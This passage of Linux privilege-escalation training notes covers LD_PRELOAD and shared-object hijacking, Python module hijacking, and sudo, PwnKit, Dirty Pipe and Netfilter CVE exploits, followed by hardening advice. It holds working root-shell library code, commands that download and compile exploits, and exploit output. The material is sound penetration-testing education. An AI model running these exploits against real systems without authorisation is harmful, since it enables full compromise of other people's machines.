            linux-vdso.so.1 =>  (0x00007fff03bc7000)
            libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
            libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
            libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
            libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
            /lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
            libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)

The image above lists all the libraries required by `/bin/ls`, along with their absolute paths.

`LD_PRELOAD Privilege Escalation`
Let's see an example of how we can utilize the [LD<sub>PRELOAD</sub>](https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) environment variable to escalate privileges. For this, we need a user with `sudo` privileges.

    sudo -l
    
    Matching Defaults entries for daniel.carter on NIX02:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
    
    User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart

This user has rights to restart the Apache service as root, but since this is `NOT` a GTFOBin and the `/etc/sudoers` entry is written specifying the absolute path, this could not be used to escalate privileges under normal circumstances. However, we can exploit the `LD_PRELOAD` issue to run a custom shared library file. Let's compile the following library:

    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
    
    void _init() {
      unsetenv("LD_PRELOAD");
      setgid(0);
      setuid(0);
      system("/bin/bash");
    }

We can compile this as follows:

    gcc -fPIC -shared -o root.so root.c -nostartfiles

Finally, we can escalate privileges using the below command. Make sure to specify the full path to your malicious library file.

    sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
    
    id
    uid=0(root) gid=0(root) groups=0(root)


<a id="orgd292677"></a>

## Shared Object Hijacking

Programs and binaries under development usually have custom libraries associated with them. Consider the following SETUID binary.

    ls -la payroll
    
    -rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll

We can use ldd to print the shared object required by a binary or shared object. `Ldd` displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies.

    ldd payroll
    
    linux-vdso.so.1 =>  (0x00007ffcb3133000)
    libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
    /lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)

We see a non-standard library named `libshared.so` listed as a dependency for the binary. As stated earlier, it is possible to load shared libraries from custom locations. One such setting is the `RUNPATH` configuration. Libraries in this folder are given preference over other folders. This can be inspected using the readelf utility.

    readelf -d payroll  | grep PATH
    
     0x000000000000001d (RUNPATH)            Library runpath: [/development]

The configuration allows the loading of libraries from the `/development` folder, which is writable by all users. This misconfiguration can be exploited by placing a malicious library in `/development` which will take precedence over other folders because entries in this file are checked first (before other folders present in the configuration files).

    ls -la /development/
    
    total 8
    drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
    drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../

Before compiling a library, we need to find the function name called by the binary.

    cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so

    ldd payroll
    
    linux-vdso.so.1 (0x00007ffd22bbc000)
    libshared.so => /development/libshared.so (0x00007f0c13112000)
    /lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)

    ./payroll 
    
    ./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery

We can copy an existing library to the `development` folder. Running `ldd` against the binary lists the library's path as `/development/libshared.so`, which means that it is vulnerable. Executing the binary throws an error stating that it failed to find the function named `dbquery`. We can compile a shared object which includes this function.

    #include<stdio.h>
    #include<stdlib.h>
    
    void dbquery() {
        printf("Malicious library loaded\n");
        setuid(0);
        system("/bin/sh -p");
    } 

The `dbquery` function sets our user id to 0 (root) and executing `/bin/sh` when called. Compile it using GCC.

    gcc src.c -fPIC -shared -o /development/libshared.so

Executing the binary again should display the banner and pops a root shell.

    ./payroll 
    
    ***************Inlane Freight Employee Database***************
    
    Malicious library loaded
    # id
    uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)


<a id="org8009ae4"></a>

## Python Library Hijacking

There are many ways in which we can hijack a Python library. Much depends on the script and its contents itself. However, there are three basic vulnerabilities where hijacking can be used:


<a id="orgde5177f"></a>

### Wrong Write Permission

One or another python module may have write permissions set for all users by mistake. This allows the python module to be edited and manipulated so that we can insert commands or functions that will produce the results we want. If `SUID~/~SGID` permissions have been assigned to the Python script that imports this module, our code will automatically be included.

If we look at the set permissions of the `mem_status.py` script, we can see that it has a `SUID` set.

    ls -l mem_status.py
    
    -rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py

So we can execute this script with the privileges of another user, in our case, as `root`. We also have permission to view the script and read its contents.

1.  Python Script - Content

        #!/usr/bin/env python3
        import psutil
        
        available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
        
        print(f"Available memory: {round(available_memory, 2)}%")
    
    So this script is quite simple and only shows the available virtual memory in percent. We can also see in the second line that this script imports the module `psutil` and uses the function `virtual_memory()`.
    
    So we can look for this function in the folder of `psutil` and check if this module has write permissions for us.

2.  Module Permissions

        grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
        
        /usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
        /usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
        /usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
        /usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
        /usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
        /usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
        /usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():
    
        ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
        
        -rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

3.  Module Contents

        def virtual_memory():
        
                ...SNIP...
        
            global _TOTAL_PHYMEM
            ret = _psplatform.virtual_memory()
            # cached for later use in Process.memory_percent()
            _TOTAL_PHYMEM = ret.total
            return ret
    
    This is the part in the library where we can insert our code. It is recommended to put it right at the beginning of the function. There we can insert everything we consider correct and effective. We can import the module `os` for testing purposes, which allows us to execute system commands. With this, we can insert the command `id` and check during the execution of the script if the inserted code is executed.

4.  Module Contents - Hijacking

        ...SNIP...
        
        def virtual_memory():
        
            ...SNIP...
            #### Hijacking
            import os
            os.system('id')
        
        
            global _TOTAL_PHYMEM
            ret = _psplatform.virtual_memory()
            # cached for later use in Process.memory_percent()
            _TOTAL_PHYMEM = ret.total
            return ret
        
        ...SNIP...
    
    Now we can run the script with `sudo` and check if we get the desired result.


<a id="org319cf57"></a>

### Library Path

In Python, each version has a specified order in which libraries (`modules`) are searched and imported from. The order in which Python imports modules from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list.
<span class="underline">PYTHoNPATH Listing</span>

    python3 -c 'import sys; print("\n".join(sys.path))'
    
    /usr/lib/python38.zip
    /usr/lib/python3.8
    /usr/lib/python3.8/lib-dynload
    /usr/local/lib/python3.8/dist-packages
    /usr/lib/python3/dist-packages

To be able to use this variant, two prerequisites are necessary.

1.  The module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable.
2.  We must have write permissions to one of the paths having a higher priority on the list.

<span class="underline">Psutil Default Installation Location</span>

    pip3 show psutil
    
    ...SNIP...
    Location: /usr/local/lib/python3.8/dist-packages
    
    ...SNIP...

<span class="underline">Misconfigured Directory Permissions</span>

    ls -la /usr/lib/python3.8
    
    total 4916
    drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
    ...SNIP...

Let us try abusing this misconfiguration to create our own `psutil` module containing our own malicious `virtual_memory()` function within the `/usr/lib/python3.8` directory.

<span class="underline">Hijacked Module Contents - psutil.py</span>

    #!/usr/bin/env python3
    
    import os
    
    def virtual_memory():
        os.system('id')


<a id="org602661a"></a>

### PYTHONPATH Environment Variable

We can see if we have the permissions to set environment variables for the python binary by checking our `sudo` permissions:

    sudo -l 
    
    Matching Defaults entries for htb-student on ACADEMY-LPENIX:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3

<span class="underline">Privilege Escalation using PYTHONPATH Environment Variable</span>

    sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
    
    uid=0(root) gid=0(root) groups=0(root)
    ...SNIP...

In this example, we moved the previous python script from the `/usr/lib/python3.8` directory to `/tmp`. From here we once again call `/usr/bin/python3` to run `mem_stats.py`, however, we specify that the `PYTHONPATH` variable contain the `/tmp` directory so that it forces Python to search that directory looking for the `psutil` module to import. As we can see, we once again have successfully run our script under the context of root.


<a id="org44194a1"></a>

# Recent 0-Days <1 oct 2023>


<a id="org9e8d217"></a>

## Sudo

The `/etc/sudoers` file specifies which users or groups are allowed to run specific programs and with what privileges.

    sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
    [sudo] password for cry0l1t3:  **********
    
    Defaults        env_reset
    Defaults        mail_badpass
    Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
    Defaults        use_pty
    root            ALL=(ALL:ALL) ALL
    %admin          ALL=(ALL) ALL
    %sudo           ALL=(ALL:ALL) ALL
    cry0l1t3        ALL=(ALL) /usr/bin/id
    @includedir     /etc/sudoers.d

One of the latest vulnerabilities for `sudo` carries the CVE-2021-3156 and is based on a heap-based buffer overflow vulnerability. This affected the sudo versions:

-   1.8.31 - Ubuntu 20.04
-   1.8.27 - Debian 10
-   1.9.2 - Fedora 33
-   and others

To find out the version of sudo, the following command is sufficient:

    sudo -V | head -n1
    
    Sudo version 1.8.31

We can either download this to a copy of the target system we have created

    git clone https://github.com/blasty/CVE-2021-3156.git
    cd CVE-2021-3156
    make
    
    rm -rf libnss_X
    mkdir libnss_X
    gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
    gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c

When running the exploit, we can be shown a list that will list all available versions of the operating systems that may be affected by this vulnerability.

    ./sudo-hax-me-a-sandwich
    usage: ./sudo-hax-me-a-sandwich <target>
    
      available targets:
      ------------------------------------------------------------
        0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
        1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
        2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
      ------------------------------------------------------------
    
      manual mode:
        ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>

We can find out which version of the operating system we are dealing with using the following command:

    cat /etc/lsb-release
    
    DISTRIB_ID=Ubuntu
    DISTRIB_RELEASE=20.04
    DISTRIB_CODENAME=focal
    DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"

Next, we specify the respective ID for the version operating system and run the exploit with our payload.

    ./sudo-hax-me-a-sandwich 1


<a id="orgd9e46c1"></a>

### Sudo Policy Bypass

Another vulnerability was found in 2019 that affected all versions below `1.8.28`, which allowed privileges to escalate even with a simple command. This vulnerability has the CVE-2019-14287 and requires only a single prerequisite. It had to allow a user in the `/etc/sudoers` file to execute a specific command.

    sudo -l
    [sudo] password for cry0l1t3: **********
    
    User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id

In fact, `Sudo` also allows commands with specific user IDs to be executed, which executes the command with the user's privileges carrying the specified ID. The ID of the specific user can be read from the `/etc/passwd` file.

    cat /etc/passwd | grep cry0l1t3
    
    cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash

Thus the ID for the user `cry0l1t3` would be `1005`. If a negative ID (`-1`) is entered at `sudo`, this results in processing the ID `0`, which only the `root` has. This, therefore, led to the immediate root shell.

    sudo -u#-1 id


<a id="orgd6ab618"></a>

## Polkit

PolicyKit (`polkit`) is an authorization service on Linux-based operating systems that allows user software and system components to communicate with each other if the user software is authorized to do so.
Polkit works with two groups of files.

1.  actions/policies (`/usr/share/polkit-1/actions`)
2.  rules (`/usr/share/polkit-1/rules.d`)

Polkit also has `local authority` rules which can be used to set or remove additional permissions for users and groups. Custom rules can be placed in the directory `/etc/polkit-1/localauthority/50-local.d` with the file extension `.pkla`.

PolKit also comes with three additional programs:

1.  `pkexec` - runs a program with the rights of another user or with root rights
2.  `pkaction` - can be used to display actions
3.  `pkcheck` - this can be used to check if a process is authorized for a specific action

The most interesting tool for us, in this case, is `pkexec` because it performs the same task as `sudo` and can run a program with the rights of another user or root.

    pkexec -u <user> <command>
    pkexec -u root id
    
    uid=0(root) gid=0(root) groups=0(root)

In the `pkexec` tool, the memory corruption vulnerability with the identifier [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034) was found, also known as Pwnkit and also leads to privilege escalation. This vulnerability was also hidden for more than ten years, and no one can precisely say when it was discovered and exploited. Finally, in November 2021, this vulnerability was published and fixed two months later.

To exploit this vulnerability, we need to download a [PoC](https://github.com/arthepsy/CVE-2021-4034) and compile it on the target system itself or a copy we have made.

    git clone https://github.com/arthepsy/CVE-2021-4034.git
    cd CVE-2021-4034
    gcc cve-2021-4034-poc.c -o poc

Once we have compiled the code, we can execute it without further ado. After the execution, we change from the standard shell (`sh`) to Bash (`bash`) and check the user's IDs.

    ./poc
    
    # id
    
    uid=0(root) gid=0(root) groups=0(root)


<a id="org3556054"></a>

## Dirty Pipe

A vulnerability in the Linux kernel, named Dirty Pipe (CVE-2022-0847), allows unauthorized writing to root user files on Linux. Technically, the vulnerability is similar to the Dirty Cow vulnerability discovered in 2016. All kernels from version `5.8` to `5.17` are affected and vulnerable to this vulnerability.

In simple terms, this vulnerability allows a user to write to arbitrary files as long as he has read access to these files. It is also interesting to note that Android phones are also affected. Android apps run with user rights, so a malicious or compromised app could take over the phone.

This vulnerability is based on pipes. Pipes are a mechanism of unidirectional communication between processes that are particularly popular on Unix systems. For example, we could edit the `/etc/passwd` file and remove the password prompt for the root. This would allow us to log in with the `su` command without the password prompt.

To exploit this vulnerability, we need to download a PoC and compile it on the target system itself or a copy we have made.

<span class="underline">Download Dirty Pipe Exploit</span>

    git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
    cd CVE-2022-0847-DirtyPipe-Exploits
    bash compile.sh

After compiling the code, we have two different exploits available. The first exploit version (`exploit-1`) modifies the `/etc/passwd` and gives us a prompt with root privileges. For this, we need to verify the kernel version and then execute the exploit.

<span class="underline">Verify Kernel Version</span>

    uname -r
    
    5.13.0-46-generic

<span class="underline">Exploitation</span>

    ./exploit-1
    
    Backing up /etc/passwd to /tmp/passwd.bak ...
    Setting root password to "piped"...
    Password: Restoring /etc/passwd from /tmp/passwd.bak...
    Done! Popping shell... (run commands now)
    
    id
    
    uid=0(root) gid=0(root) groups=0(root)

With the help of the 2nd exploit version (`exploit-2`), we can execute SUID binaries with root privileges. However, before we can do that, we first need to find these SUID binaries. For this, we can use the following command:

<span class="underline">Find SUID Binaries</span>

    find / -perm -4000 2>/dev/null
    
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/openssh/ssh-keysign
    /usr/lib/snapd/snap-confine
    /usr/lib/policykit-1/polkit-agent-helper-1
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/xorg/Xorg.wrap
    /usr/sbin/pppd
    /usr/bin/chfn
    /usr/bin/su
    /usr/bin/chsh
    /usr/bin/umount
    /usr/bin/passwd
    /usr/bin/fusermount
    /usr/bin/sudo
    /usr/bin/vmware-user-suid-wrapper
    /usr/bin/gpasswd
    /usr/bin/mount
    /usr/bin/pkexec
    /usr/bin/newgrp

Then we can choose a binary and specify the full path of the binary as an argument for the exploit and execute it.

<span class="underline">Exploitation</span>

    ./exploit-2 /usr/bin/sudo
    
    [+] hijacking suid binary..
    [+] dropping suid shell..
    [+] restoring suid binary..
    [+] popping root shell.. (dont forget to clean up /tmp/sh ;))
    
    # id
    
    uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(cry0l1t3)


<a id="org3e301d2"></a>

## Netfilter

Netfilter is a vital Linux kernel module that plays a crucial role in managing network traffic by offering features like packet filtering, network address translation, and various tools for firewall configurations. It operates at the software layer within the Linux kernel and is responsible for controlling and regulating network data flows by manipulating individual packets according to predefined rules. When network packets are received or sent, Netfilter triggers the execution of other modules, such as packet filters, which can intercept and modify packets. Key components like iptables and arptables are used as action mechanisms within the Netfilter hook system for both IPv4 and IPv6 protocol stacks.

This kernel module serves three primary functions:

1.  `Packet Defragmentation`: Netfilter handles the reassembly of fragmented IP packets before they are forwarded to their intended applications.

2.  `Connection Tracking`: It maintains a record of active connections, which is essential for stateful packet inspection, a common feature in firewalls.

3.  `Network Address Translation (NAT)`: Netfilter allows the translation of private IP addresses to public ones and vice versa, facilitating the routing of traffic between internal networks and the internet.

However, despite its crucial role in network security and routing, Netfilter has faced security vulnerabilities in recent years. In 2021 (CVE-2021-22555), 2022 (CVE-2022-1015), and 2023 (CVE-2023-32233), several vulnerabilities were discovered that had the potential to lead to privilege escalation. This underscores the importance of keeping the software and systems updated to mitigate such risks.

For many organizations, the challenge of maintaining and updating Linux distributions can be significant. Companies often use preconfigured Linux distributions tailored to their specific software applications or vice versa. This configuration provides a stable foundation that can be challenging to replace or update. Adapting an entire system to a new software application or vice versa can be a time-consuming and resource-intensive process, particularly for large and complex applications. This is one reason why many companies continue to run older, possibly unsupported, Linux distributions in production environments.

Even when organizations use virtualization technologies like virtual machines or containers (e.g., Docker) to isolate their applications from the underlying host system, the kernel plays a crucial role. While isolation is a positive step for security, there are various methods to escape from such containers, and security must be maintained at multiple levels to ensure a robust defense against potential threats.


<a id="org27469d7"></a>

### CVE-2021-22555

**Vulnerable kernel versions: 2.6 - 5.11**

    wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
    gcc -m32 -static exploit.c -o exploit
    ./exploit
    
    [+] Linux Privilege Escalation by theflow@ - 2021
    
    [+] STAGE 0: Initialization
    [*] Setting up namespace sandbox...
    [*] Initializing sockets and message queues...
    
    [+] STAGE 1: Memory corruption
    [*] Spraying primary messages...
    [*] Spraying secondary messages...
    [*] Creating holes in primary messages...
    [*] Triggering out-of-bounds write...
    [*] Searching for corrupted primary message...
    [+] fake_idx: fff
    [+] real_idx: fdf
    
    ...SNIP...
    
    # id
    
    uid=0(root) gid=0(root) groups=0(root)


<a id="org957550a"></a>

### CVE-2022-25636

A recent vulnerability is CVE-2022-25636 and affects Linux kernel 5.4 through 5.6.10. This is `net/netfilter/nf_dup_netdev.c`, which can grant root privileges to local users due to heap out-of-bounds write.

However, we need to be careful with this exploit as it can corrupt the kernel, and a reboot will be required to reaccess the server.

    git clone https://github.com/Bonfee/CVE-2022-25636.git
    cd CVE-2022-25636
    make
    ./exploit
    
    [*] STEP 1: Leak child and parent net_device
    [+] parent net_device ptr: 0xffff991285dc0000
    [+] child  net_device ptr: 0xffff99128e5a9000
    
    [*] STEP 2: Spray kmalloc-192, overwrite msg_msg.security ptr and free net_device
    [+] net_device struct freed
    
    [*] STEP 3: Spray kmalloc-4k using setxattr + FUSE to realloc net_device
    [+] obtained net_device struct
    
    [*] STEP 4: Leak kaslr
    [*] kaslr leak: 0xffffffff823093c0
    [*] kaslr base: 0xffffffff80ffefa0
    
    [*] STEP 5: Release setxattrs, free net_device, and realloc it again
    [+] obtained net_device struct
    
    [*] STEP 6: rop :)
    
    # id
    
    uid=0(root) gid=0(root) groups=0(root)


<a id="org3579acb"></a>

### CVE-2023-32233

This vulnerability exploits the so called `anonymous sets` in `nf_tables` by using the `Use-After-Free` vulnerability in the Linux Kernel up to version `6.3.1`. These `nf_tables` are temprorary workspaces for processing batch requests and once the processing is done, these anonymous sets are supposed to be cleared out (`Use-After-Free`) so they cannot be used anymore. Due to a mistake in the code, these anonymous sets are not being handled properly and can still be accessed and modified by the program.

The exploitation is done by manipulating the system to use the `cleared out` anonymous sets to interact with the kernel's memory. By doing so, we can potentially gain `root` privileges.

<span class="underline">Proof-Of-Concept</span>

    git clone https://github.com/Liuk3r/CVE-2023-32233
    cd CVE-2023-32233
    gcc -Wall -o exploit exploit.c -lmnl -lnftnl

<span class="underline">Exploitation</span>

    ./exploit
    
    [*] Netfilter UAF exploit
    
    Using profile:
    ========
    1                   race_set_slab                   # {0,1}
    1572                race_set_elem_count             # k
    4000                initial_sleep                   # ms
    100                 race_lead_sleep                 # ms
    600                 race_lag_sleep                  # ms
    100                 reuse_sleep                     # ms
    39d240              free_percpu                     # hex
    2a8b900             modprobe_path                   # hex
    23700               nft_counter_destroy             # hex
    347a0               nft_counter_ops                 # hex
    a                   nft_counter_destroy_call_offset # hex
    ffffffff            nft_counter_destroy_call_mask   # hex
    e8e58948            nft_counter_destroy_call_check  # hex
    ========
    
    [*] Checking for available CPUs...
    [*] sched_getaffinity() => 0 2
    [*] Reserved CPU 0 for PWN Worker
    [*] Started cpu_spinning_loop() on CPU 1
    [*] Started cpu_spinning_loop() on CPU 2
    [*] Started cpu_spinning_loop() on CPU 3
    [*] Creating "/tmp/modprobe"...
    [*] Creating "/tmp/trigger"...
    [*] Updating setgroups...
    [*] Updating uid_map...
    [*] Updating gid_map...
    [*] Signaling PWN Worker...
    [*] Waiting for PWN Worker...
    
    ...SNIP...
    
    [*] You've Got ROOT:-)
    
    # id
    
    uid=0(root) gid=0(root) groups=0(root)	

Please keep in mind that these exploits can be very unstable and can break the system.


<a id="orgfc25581"></a>

# Hardening Considerations

In the realm of Linux hardening, taking the appropriate measures can effectively mitigate the chances of local privilege escalation. Here is a summary of key steps to enhance Linux security:

1.  `Updates and Patching`: Regularly applying updates and patches is crucial to eliminate known vulnerabilities in the Linux kernel and third-party services. Outdated software can be an easy target for privilege escalation exploits. Automated tools like "unattended-upgrades" on Ubuntu and "yum-cron" on Red Hat-based systems can help streamline this process.

2.  `Configuration Management`: Implementing sound configuration management practices is essential. This includes auditing writable files and directories, using absolute paths for binaries in cron jobs and sudo privileges, avoiding storing credentials in cleartext, cleaning up home directories and bash history, and removing unnecessary packages and services. Consider using security-enhancing technologies like SELinux.

3.  `User Management`: Proper user management involves limiting the number of user and admin accounts, monitoring logon attempts, enforcing strong password policies, regularly rotating passwords, and preventing the reuse of old passwords. Assign users to groups that grant only the minimum necessary privileges, following the principle of least privilege.

Templates exist for configuration management automation tools such as Puppet, SaltStack, Zabbix and Nagios to automate such checks and can be used to push messages to a Slack channel or email box as well as via other methods.

1.  `Audit`: Conduct periodic security and configuration checks on all systems. Compliance frameworks such as DISA STIGs, ISO27001, PCI-DSS, and HIPAA can provide guidelines for establishing security baselines, but these should be adapted to the organization's specific needs. Regular audits should complement vulnerability scanning and penetration testing efforts.

2.  `Use Auditing Tools`: Tools like Lynis can help audit Unix-based systems like Linux, macOS, and BDS. Lynis examines the system's configuration, provides hardening recommendations, and can serve as a baseline for security assessment. It should be used alongside manual techniques to ensure comprehensive security.

Running Lynis as an example:

    ./lynis audit system

Lynis will generate warnings and suggestions based on its analysis, which can be valuable for identifying security gaps.

In conclusion, privilege escalation on Linux/Unix systems can occur due to various factors, from misconfigurations to known vulnerabilities. Preventing such escalation is crucial, as obtaining root access can lead to further network exploitation. Effective Linux hardening is essential for organizations of all sizes, and it involves a combination of best practice guidelines, manual testing, and automated configuration checks to maintain a secure and robust system.

